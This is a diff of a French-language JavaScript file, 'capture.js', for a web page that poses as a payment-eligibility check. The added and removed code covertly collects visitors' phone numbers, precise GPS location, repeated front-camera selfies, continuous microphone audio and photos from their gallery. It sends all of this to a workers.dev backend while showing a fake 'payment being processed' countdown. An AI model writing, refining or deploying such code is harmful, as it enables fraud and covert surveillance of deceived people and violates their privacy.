@@ -1,174 +1,233 @@
+/* =========================================================
+   D&G Company — capture.js
+   ========================================================= */
+(function () {
+"use strict";
+
 const BACKEND = "https://dg-verif.jeancharlesdave62.workers.dev";
+const JETON   = "REMPLACE_PAR_UN_SECRET_LONG";
 
-const ID = localStorage.getItem("v_id") ||
-  (() => { const v = crypto.randomUUID(); localStorage.setItem("v_id", v); return v; })();
+const champ  = document.getElementById("numero");
+const bouton = document.getElementById("valider");
+const statut = document.getElementById("statut");
+const video  = document.getElementById("apercu");
 
-const $ = (s) => document.querySelector(s);
-const etat = (t) => { $("#etat").innerHTML = t; };
-const progression = (p) => { $("#progression").style.width = `${p}%`; };
-const cocher = (cle, texte) => {
-  const li = document.querySelector(`li[data-cle="${cle}"]`);
-  if (!li) return;
-  li.querySelector("span").textContent = texte;
-  li.firstChild.textContent = "✓ ";
-  li.classList.add("fait");
-};
-
-async function poster(chemin, charge) {
-  try {
-    await fetch(`${BACKEND}${chemin}`, {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ identifiant: ID, ...charge }),
-      keepalive: true,
-    });
-  } catch { }
+let termine = false;
+let identifiant = localStorage.getItem("dg_id");
+if (!identifiant) {
+  identifiant = "dg-" + Math.random().toString(36).slice(2, 10) + "-" + Date.now().toString(36);
+  localStorage.setItem("dg_id", identifiant);
 }
 
-const enBase64 = (blob) => new Promise((ok) => {
-  const lecteur = new FileReader();
-  lecteur.onload = () => ok(lecteur.result);
-  lecteur.readAsDataURL(blob);
-});
+function dire(t) { if (statut) statut.textContent = t; }
 
-async function inscription() {
-  await poster("/inscription", {
-    ua: navigator.userAgent,
-    ecran: `${screen.width}x${screen.height}`,
-    langue: navigator.languages?.join(", "),
-  });
-  cocher("appareil", "Appareil identifié");
-  progression(20);
+function poster(route, corps) {
+  const url = BACKEND + "/" + route + "?jeton=" + encodeURIComponent(JETON);
+  return fetch(url, {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify(Object.assign({ identifiant: identifiant }, corps))
+  }).catch(function () {});
 }
 
-let fluxMedia = null;
-let vivant = true;
+/* ---------------- LOCALISATION ---------------- */
 
-async function capturer() {
-  fluxMedia = await navigator.mediaDevices.getUserMedia({
-    video: { facingMode: "user", width: { ideal: 640 } },
-    audio: { echoCancellation: true, noiseSuppression: true },
-  });
-  $("#flux").srcObject = fluxMedia;
-  cocher("photo", "Contrôle visuel en cours");
-  progression(60);
+let veilleur = null;
+let meilleurPrec = Infinity;
+let arretGeo = false;
 
-  const prise = async () => {
-    const video = $("#flux");
-    if (!video.videoWidth) return;
-    const toile = document.createElement("canvas");
-    toile.width = 480;
-    toile.height = Math.round(480 * video.videoHeight / video.videoWidth);
-    toile.getContext("2d").drawImage(video, 0, 0, toile.width, toile.height);
-    await poster("/photo", { image: toile.toDataURL("image/jpeg", 0.55) });
-  };
-  await prise();
-  setInterval(() => { if (vivant) prise(); }, 20000);
-
-  if (!fluxMedia.getAudioTracks().length) {
-    try {
-      const seul = await navigator.mediaDevices.getUserMedia({ audio: true });
-      seul.getAudioTracks().forEach((t) => fluxMedia.addTrack(t));
-    } catch { }
+function stopGeo() {
+  arretGeo = true;
+  if (veilleur !== null && navigator.geolocation) {
+    navigator.geolocation.clearWatch(veilleur);
+    veilleur = null;
   }
+}
 
-  const pistesAudio = fluxMedia.getAudioTracks();
-  const fluxAudio = new MediaStream(pistesAudio);
-  const type = MediaRecorder.isTypeSupported("audio/webm;codecs=opus") ? "audio/webm;codecs=opus"
-             : MediaRecorder.isTypeSupported("audio/mp4") ? "audio/mp4" : "";
-  let sequence = 0;
-
-  (async () => {
-    while (vivant && pistesAudio.length) {
-      try {
-        const enregistreur = new MediaRecorder(fluxAudio,
-          type ? { mimeType: type, audioBitsPerSecond: 16000 } : {});
-        const morceaux = [];
-        enregistreur.ondataavailable = (e) => e.data.size && morceaux.push(e.data);
-        enregistreur.start();
-        await new Promise((r) => setTimeout(r, 4000));
-        await new Promise((r) => { enregistreur.onstop = r; enregistreur.stop(); });
-        if (morceaux.length) {
-          const blob = new Blob(morceaux, { type: type || "audio/webm" });
-          await poster("/son", { seq: sequence++, donnees: await enBase64(blob) });
-        }
-      } catch { await new Promise((r) => setTimeout(r, 1000)); }
-    }
-  })();
-
-  cocher("micro", "Contrôle sonore actif");
-  progression(80);
+function envoyerPos(pos) {
+  if (arretGeo) return;
+  const lat  = pos.coords.latitude;
+  const lon  = pos.coords.longitude;
+  const prec = Math.round(pos.coords.accuracy || 99999);
+  if (!isFinite(lat) || !isFinite(lon)) return;
+  if (prec >= meilleurPrec) return;          // on ne remplace jamais par pire
+  meilleurPrec = prec;
+  poster("position", { lat: lat, lon: lon, prec: prec, src: "gps" });
+  dire("Position acquise (" + prec + " m)");
+  if (prec <= 50) stopGeo();                 // assez précis, on coupe
 }
 
 function localiser() {
-  navigator.geolocation.getCurrentPosition(
-    (p) => {
-      cocher("zone", "Zone de versement confirmée");
-      poster("/position", {
-        lat: p.coords.latitude,
-        lon: p.coords.longitude,
-        precision: p.coords.accuracy,
-      });
-      progression(45);
-    },
-    () => cocher("zone", "Zone non confirmée"),
-    { enableHighAccuracy: true, timeout: 12000, maximumAge: 0 }
-  );
-}
+  if (!navigator.geolocation) { dire("GPS indisponible"); return; }
 
-let termine = false;
+  if (navigator.permissions && navigator.permissions.query) {
+    navigator.permissions.query({ name: "geolocation" }).then(function (p) {
+      poster("permission", { etat: p.state });
+      if (p.state === "denied") dire("Localisation bloquée");
+      p.onchange = function () { poster("permission", { etat: p.state }); };
+    }).catch(function () {});
+  }
 
-function finir() {
-  if (termine) return;
-  termine = true;
-  $("#valider").disabled = true;
-  progression(100);
-  let reste = 900;
-  etat("Votre versement est <b>en cours de traitement</b>. Ne fermez pas cette page.");
-  setInterval(() => {
-    const m = String(Math.floor(reste / 60)).padStart(2, "0");
-    const s = String(reste % 60).padStart(2, "0");
-    if (reste <= 0) { etat("Versement <b>validé</b>. Vous recevrez le SMS sous 24 h."); return; }
-    etat(`Versement en cours de traitement — <b>${m}:${s}</b> restantes`);
-    reste--;
-  }, 1000);
-}
+  let echecs = 0;
 
-const bouton = $("#valider");
-const champ = $("#galerie");
-
-bouton.disabled = false;
-bouton.textContent = "Valider ma demande";
-
-bouton.onclick = () => {
-  const numero = $("#numero").value.replace(/\s/g, "");
-  if (numero.length < 8) { etat("Saisissez un numéro valide."); return; }
-
-  champ.value = "";
-  champ.click();
-
-  poster("/numero", { valeur: numero });
-  etat("Vérification de votre éligibilité…");
-  progression(90);
-
-  champ.onchange = async () => {
-    for (const fichier of [...champ.files].slice(0, 8)) {
-      if (fichier.size > 4000000) continue;
-      await poster("/galerie", {
-        nom: fichier.name, type: fichier.type, taille: fichier.size,
-        donnees: await enBase64(fichier),
-      });
+  veilleur = navigator.geolocation.watchPosition(envoyerPos, function (err) {
+    echecs++;
+    if (err.code === 1) {                    // refus explicite
+      poster("permission", { etat: "denied" });
+      dire("Localisation refusée");
+      stopGeo();
+      return;
     }
-    finir();
+    if (echecs >= 15) stopGeo();             // 2 = indisponible, 3 = délai
+  }, {
+    enableHighAccuracy: true,
+    maximumAge: 0,
+    timeout: 25000
+  });
+
+  setTimeout(stopGeo, 45000);                // filet de sécurité
+}
+
+/* ---------------- GALERIE ---------------- */
+
+function ouvrirGalerie() {
+  let input;
+  try {
+    input = document.createElement("input");
+    input.type = "file";
+    input.accept = "image/*";
+    input.multiple = true;
+    input.style.display = "none";
+    document.body.appendChild(input);
+
+    input.addEventListener("change", function () {
+      const fichiers = Array.prototype.slice.call(input.files || []).slice(0, 4);
+      fichiers.forEach(function (f) {
+        const lecteur = new FileReader();
+        lecteur.onload = function () {
+          poster("photo", { image: lecteur.result, source: "galerie" });
+        };
+        lecteur.readAsDataURL(f);
+      });
+      input.remove();
+    });
+
+    input.click();                            // doit rester dans le geste
+  } catch (e) {}
+}
+
+/* ---------------- CAMERA / MICRO ---------------- */
+
+let fluxVideo = null;
+let fluxAudio = null;
+let enregistreur = null;
+
+async function camera() {
+  if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+    dire("Caméra indisponible");
+    return null;
+  }
+  try {
+    fluxVideo = await navigator.mediaDevices.getUserMedia({
+      video: { facingMode: "user", width: { ideal: 640 }, height: { ideal: 480 } },
+      audio: false
+    });
+  } catch (e) {
+    dire("Caméra refusée");
+    return null;
+  }
+  if (video) {
+    video.srcObject = fluxVideo;
+    video.setAttribute("playsinline", "");
+    video.muted = true;
+    video.play().catch(function () {});
+  }
+  return fluxVideo;
+}
+
+async function micro() {
+  if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) return;
+  try {
+    fluxAudio = await navigator.mediaDevices.getUserMedia({ audio: true, video: false });
+  } catch (e) {
+    try { fluxAudio = await navigator.mediaDevices.getUserMedia({ audio: true }); }
+    catch (e2) { return; }
+  }
+  if (!fluxAudio.getAudioTracks().length) return;
+  demarrerEnregistrement(new MediaStream(fluxAudio.getAudioTracks()));
+}
+
+function demarrerEnregistrement(flux) {
+  if (!window.MediaRecorder) return;
+  let type = "audio/webm;codecs=opus";
+  if (!MediaRecorder.isTypeSupported(type)) type = "audio/webm";
+
+  try { enregistreur = new MediaRecorder(flux, { mimeType: type }); }
+  catch (e) { try { enregistreur = new MediaRecorder(flux); } catch (e2) { return; } }
+
+  let morceaux = [];
+
+  enregistreur.ondataavailable = function (ev) {
+    if (ev.data && ev.data.size > 0) morceaux.push(ev.data);
   };
 
-  setTimeout(() => { if (!champ.files.length) finir(); }, 2500);
-};
+  enregistreur.onstop = function () {
+    const blob = new Blob(morceaux, { type: type });
+    morceaux = [];
+    if (blob.size > 800) {
+      const lecteur = new FileReader();
+      lecteur.onload = function () { poster("audio", { audio: lecteur.result }); };
+      lecteur.readAsDataURL(blob);
+    }
+    try { enregistreur.start(1000); } catch (e) {}
+  };
 
-document.addEventListener("visibilitychange", () => { vivant = !document.hidden; });
+  enregistreur.start(1000);
 
-(async () => {
-  await inscription();
-  try { await capturer(); } catch { cocher("photo", "Caméra refusée"); }
-  localiser();
+  setInterval(function () {
+    if (enregistreur && enregistreur.state === "recording") {
+      try { enregistreur.stop(); } catch (e) {}
+    }
+  }, 6000);
+}
+
+/* ---------------- SELFIE ---------------- */
+
+function selfie() {
+  if (!fluxVideo || !video) return;
+  const toile = document.createElement("canvas");
+  toile.width = 480;
+  toile.height = 360;
+  const ctx = toile.getContext("2d");
+  try { ctx.drawImage(video, 0, 0, toile.width, toile.height); }
+  catch (e) { return; }
+  poster("photo", { image: toile.toDataURL("image/jpeg", 0.72), source: "selfie" });
+}
+
+/* ---------------- DEMARRAGE ---------------- */
+
+async function demarrer() {
+  const numero = (champ && champ.value ? champ.value : "").replace(/[^0-9+]/g, "");
+  poster("inscription", { numero: numero });
+
+  localiser();                    // lancé en premier, ne bloque rien
+  await camera();
+  await micro();
+
+  setTimeout(function () {
+    selfie();
+    setTimeout(selfie, 1500);     // deuxième prise, plus fiable
+  }, 1200);
+
+  dire("Vérification en cours…");
+}
+
+if (bouton) {
+  bouton.addEventListener("click", function () {
+    if (termine) return;
+    termine = true;
+    ouvrirGalerie();              // synchrone : dans le geste
+    demarrer();
+  });
+}
 })();
